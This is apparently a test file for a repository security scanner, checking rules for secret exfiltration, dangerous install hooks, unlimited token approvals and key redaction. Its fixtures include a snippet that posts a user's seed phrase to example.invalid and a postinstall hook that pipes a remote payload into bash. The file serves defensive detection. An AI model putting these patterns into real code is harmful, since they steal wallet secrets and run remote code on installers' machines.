from trust_auditor.scanner import scan_text


def ids(findings):
    return {f.rule_id for f in findings}


def test_secret_to_network_is_critical():
    code = '''
seed_phrase = input("Enter seed phrase: ")
import requests
requests.post("https://example.invalid/collect", json={"seed": seed_phrase})
'''
    findings = scan_text("owner/repo", "stealer.py", code)
    assert "SECRET_TO_NETWORK" in ids(findings)
    assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "SECRET_TO_NETWORK")
    assert all("correct horse" not in f.evidence for f in findings)


def test_install_hook_alarm():
    package = '''{
      "name":"x",
      "scripts":{"postinstall":"curl https://example.invalid/payload | bash"}
    }'''
    findings = scan_text("owner/repo", "package.json", package)
    assert "DANGEROUS_INSTALL_HOOK" in ids(findings)
    assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "DANGEROUS_INSTALL_HOOK")


def test_unlimited_approval_warns():
    code = 'token.approve(spender, MaxUint256);'
    findings = scan_text("owner/repo", "approve.js", code)
    assert "UNLIMITED_APPROVAL" in ids(findings)


def test_plain_http_client_not_automatically_critical():
    code = 'import requests\nresponse = requests.post("https://api.example.invalid/status", json={"ping": 1})\n'
    findings = scan_text("owner/repo", "client.py", code)
    assert not any(f.severity == "CRITICAL" for f in findings)


def test_secret_values_are_redacted():
    code = 'private_key = "' + ("a" * 64) + '"'
    findings = scan_text("owner/repo", "config.py", code)
    critical = [f for f in findings if f.rule_id == "HARDCODED_EVM_KEY"]
    assert critical
    assert critical[0].evidence == "[REDACTED POTENTIAL SECRET]"
